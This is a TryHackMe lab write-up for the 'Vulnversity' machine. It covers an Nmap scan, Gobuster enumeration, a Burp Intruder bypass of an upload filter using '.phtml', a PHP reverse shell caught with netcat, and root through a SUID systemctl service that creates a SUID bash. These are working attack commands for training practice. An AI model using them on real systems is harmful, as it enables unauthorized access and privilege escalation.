[vulnversity.md](https://github.com/user-attachments/files/26420558/vulnversity.md)
# Vulnversity — TryHackMe Writeup

**Platform**: TryHackMe  
**Difficulty**: Easy  
**Skills**: Nmap, Gobuster, Burp Suite, file upload bypass, SUID privilege escalation

---

## Overview

Vulnversity is a beginner-friendly room covering the full attack chain: reconnaissance, directory enumeration, web application exploitation via a file upload bypass, and privilege escalation using a SUID binary.

---

## Step 1 — Reconnaissance (Nmap)

Started with a service version scan to identify open ports and running services.

```bash
nmap -sV 10.10.128.231
```

**Results — 6 open ports:**

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 139 | NetBIOS-SSN |
| 445 | NetBIOS-SSN |
| 3128 | HTTP Proxy (4.10) |
| 3333 | HTTP |

OS identified: Ubuntu Linux.

The web server was running on port 3333, so that became the focus.

---

## Step 2 — Directory Enumeration (Gobuster)

Used Gobuster to brute-force hidden directories on the web server.

```bash
gobuster dir -u http://10.10.128.231:3333 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt
```

**Useful Gobuster flags:**

| Flag | Description |
|------|-------------|
| `-e` | Print full URLs in output |
| `-u` | Target URL |
| `-w` | Path to wordlist |
| `-U` / `-P` | Username and password for basic auth |
| `-p` | Proxy to use |
| `-c` | Specify a cookie for auth simulation |

**Discovered directories:** `/images`, `/css`, `/js`, `/internal`

The `/internal` directory had a file upload form — the most interesting finding.

---

## Step 3 — File Upload Bypass (Burp Suite)

The upload form was filtering certain file extensions. To find which extensions were allowed, I created a wordlist of PHP variants:

```
.php
.php3
.php4
.php5
.phtml
```

**Burp Suite setup:**
- Configured Burp as a proxy by modifying Firefox's proxy settings
- Turned on Burp's intercept
- Uploaded a test file through the form
- Captured the request and sent it to **Intruder**
- Set attack type: **Sniper**
- Added the extension as the payload position
- Loaded the PHP extensions wordlist as payloads and launched the attack

**Result:** `.phtml` was not blocked by the server.

With the allowed extension confirmed, I grabbed a PHP reverse shell, updated it with my IP and port, and saved it as `shell.phtml`.

---

## Step 4 — Gaining Access (Reverse Shell)

Set up a Netcat listener:

```bash
nc -vlnp 1234
```

Uploaded `shell.phtml` through the form and navigated to the `/internal/uploads/` directory to trigger it.

Shell caught. Navigated to `/home` to find the user flag.

---

## Step 5 — Privilege Escalation (SUID Abuse)

Searched for files with the SUID bit set — these run with the permissions of the file owner, which can be abused to escalate to root.

```bash
find / -type f -perm -u=s 2>/dev/null
```

Found an unusual entry: `/bin/systemctl` — systemctl with SUID is a known privilege escalation vector.

**Exploit — malicious systemd service:**

Since `nano` and `vi` weren't available, built the service file line by line:

```bash
cd /tmp
echo '[Unit]' > root.service
echo 'Description=Root Shell Service' >> root.service
echo >> root.service
echo '[Service]' >> root.service
echo 'Type=oneshot' >> root.service
echo 'User=root' >> root.service
echo 'ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"' >> root.service
echo >> root.service
echo '[Install]' >> root.service
echo 'WantedBy=multi-user.target' >> root.service
```

Verified the file was created correctly:

```bash
cat /tmp/root.service
```

Then executed:

```bash
# Link the service
/bin/systemctl link /tmp/root.service

# Start it — this runs ExecStart as root
/bin/systemctl start root

# Use the new SUID bash binary
/tmp/rootbash -p

# Confirm
whoami
# root
```

Found the flag:

```bash
find / -name root.txt -o -name flag.txt 2>/dev/null
cat /root/root.txt
```

---

## Key Takeaways

- Extension filtering on file uploads can often be bypassed by testing less common variants like `.phtml`
- Burp Suite's Intruder is effective for fuzzing upload filters
- SUID binaries like `/bin/systemctl` are high-value privilege escalation targets — always check for them post-access
- When text editors aren't available, `echo >>` can still build files line by line
